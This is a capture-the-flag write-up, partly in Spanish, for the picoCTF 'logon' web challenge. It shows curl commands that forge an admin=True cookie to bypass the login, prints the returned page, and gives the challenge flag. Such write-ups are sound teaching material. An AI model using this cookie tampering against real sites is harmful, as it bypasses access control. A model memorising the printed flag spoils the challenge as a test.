# logon

## Objetivo

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796

## Hints

Hmm it doesn't seem to check anyone's password, except for Joe's?

## Solución

### Solución 1
```
jessy_vl-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie: username=jess; password=hola; admin=True"
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF 2019</p>
        </footer>

    </div>
</body>

</html>jessy_vl-picoctf@webshell:~$ 

jessy_vl-picoctf@webshell:~$ curl -L -s https://jupiter.challenges.picoctf.org/problem/15796/flag -H "Cookie:admin=True" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
jessy_vl-picoctf@webshell:~$ 

```

## Flag

picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}

## Notas adicionales

| Comando | Descripción |
|------------|-------------|
| curl | Sirve para verificar la conectividad a las URL y para transferir los datos   |
| -H |  Permite el envio de encabezados  |
| -s |  Es un modo silencioso |
| -L |  Es una riderección |

Permitio el uso de una extención para poder ver los cookies

## Referencias

[HTTP](https://developer.mozilla.org/es/docs/Web/HTTP)
[HTTP HEADERS](https://developer.mozilla.org/es/docs/Web/HTTP/Headers)